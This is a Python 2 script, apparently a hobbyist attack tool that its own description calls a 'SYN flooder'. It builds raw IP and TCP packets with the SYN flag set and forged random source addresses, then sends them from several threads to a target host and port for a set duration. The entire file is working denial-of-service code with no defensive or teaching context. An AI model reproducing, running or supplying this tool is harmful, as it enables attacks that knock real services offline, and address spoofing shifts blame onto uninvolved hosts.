import argparse
import random
import socket
import sys
import time

from collections import OrderedDict
from struct import pack
from threading import Thread

class Flooder(Thread):

    def __init__(self, f_id, host, port, throttle):
        Thread.__init__(self)
        self.f_id = f_id
        self.host = host
        self.port = port
        self.running = True
        self.throttle = throttle
        self.sock = None
        self.fd = None
        
        self.setup_sock()

    def run(self):
        ip_hdr_d = self.init_ip_hdr()
        tcp_hdr_d = self.init_tcp_hdr()

        while self.running:
            self.fire(ip_hdr_d, tcp_hdr_d)
            print "Thread {f_id} is alive".format(f_id=self.f_id)
            time.sleep(self.throttle)

        print "Thread {f_id} is exiting".format(f_id=self.f_id)
        self.sock.close()
            

    def fire(self, ip_hdr_d, tcp_hdr_d):
        raw_ip = self.create_ip_hdr(ip_hdr_d, self.host)
        raw_tcp = self.create_tcp_hdr(tcp_hdr_d, self.port)
        pkt = raw_ip + raw_tcp

        self.sock.sendto(pkt, (self.host, 0))

    def setup_sock(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except Exception, e:
            print("Flooder {f_id} failed to create socket".format(f_id=self.f_id))
            print(e)
            return None
        
    def init_ip_hdr(self):
        ihl = 5
        ver = 4
        
        hdr_dict = OrderedDict()
        hdr_dict["ihl_ver"] = 0
        hdr_dict["tos"] = 0
        hdr_dict["len"] = 0
        hdr_dict["id"] = 0
        hdr_dict["frag_off"] = 0 # randomize later
        hdr_dict["ttl"] = 225
        hdr_dict["proto"] = socket.IPPROTO_TCP
        hdr_dict["check"] = 0
        hdr_dict["saddr"] = 0    # randomize later
        hdr_dict["daddr"] = 0
        
        hdr_dict["ihl_ver"] = (ver << 4) + ihl
        
        return hdr_dict

    def init_tcp_hdr(self):
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        doff = 5
        
        hdr_dict = OrderedDict()
        hdr_dict["src_port"] = 0
        hdr_dict["dest_port"] = 0
        hdr_dict["seq"] = 0
        hdr_dict["ack_seq"] = 0
        hdr_dict["offset_res"] = 0
        hdr_dict["flags"] = 0
        hdr_dict["window"] = socket.htons(5840)
        hdr_dict["check"] = 0
        hdr_dict["urg_ptr"] = 0
       

        hdr_dict["offset_res"] = (doff << 4) + 0
        hdr_dict["flags"] = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)

        return hdr_dict

    def create_ip_hdr(self, hdr_d, target_ip):
        fmt = "!BBHHHBBH4s4s"
        hdr_d["saddr"] = socket.inet_aton(self.rand_ip())
        hdr_d["daddr"] = socket.inet_aton(target_ip)

        hdr_lst = list(hdr_d.values())
        raw_hdr = pack(fmt, *hdr_lst)
        
        return raw_hdr
        
    def create_tcp_hdr(self, hdr_d, target_port):
        fmt = "!HHLLBBHHH"

        hdr_d["src_port"] = random.randint(1025, 65535)
        hdr_d["dest_port"] = target_port
        hdr_d["seq"] = random.randint(0, 1024)

        hdr_lst = list(hdr_d.values())
        raw_hdr = pack(fmt, *hdr_lst)

        return raw_hdr
        
    def rand_ip(self):
        invalid_set = [10, 127, 169, 172, 192, 255]
        first = random.randint(1, 255)

        while first in invalid_set:
            first = random.randint(1, 255)

        ip = str(first) + '.' + '.'.join("%s" % random.randint(0, 255) for _ in range(3))
        return ip

def main():
    parser = argparse.ArgumentParser(description="lelelelel SYN flooder")
    parser.add_argument("host", help="Target host" )
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("-w", "--wait", type=int, help="Time between requests per thread")
    parser.add_argument("-t", "--threads", type=int, help="Number of threads")
    parser.add_argument("-d", "--duration", type=int, help="Flooding duration" )

    args = parser.parse_args()
    print "host: " + args.host
    print "port: " + str(args.port)
    print "wait: " + str(args.wait)
    print "threads: " + str(args.threads)
    print "duration: " + str(args.duration)

    t_count = 1
    t_wait = 0
    duration = 0
    
    host = None
    port = 0

    t_pool = []
    
    if args.threads is not None:
        t_count = args.threads
    if args.wait is not None:
        t_wait = args.wait
    if args.duration is not None:
        duration = args.duration

    host = args.host
    port = args.port

    for i in xrange(0, t_count):
        t = Flooder(i, host, port, t_wait)
        t.start()
        t_pool.append(t)
        
    time.sleep(duration)

    for thd in t_pool:
        thd.running = False

    print "exiting"
        
if __name__ == "__main__":
    main()
    
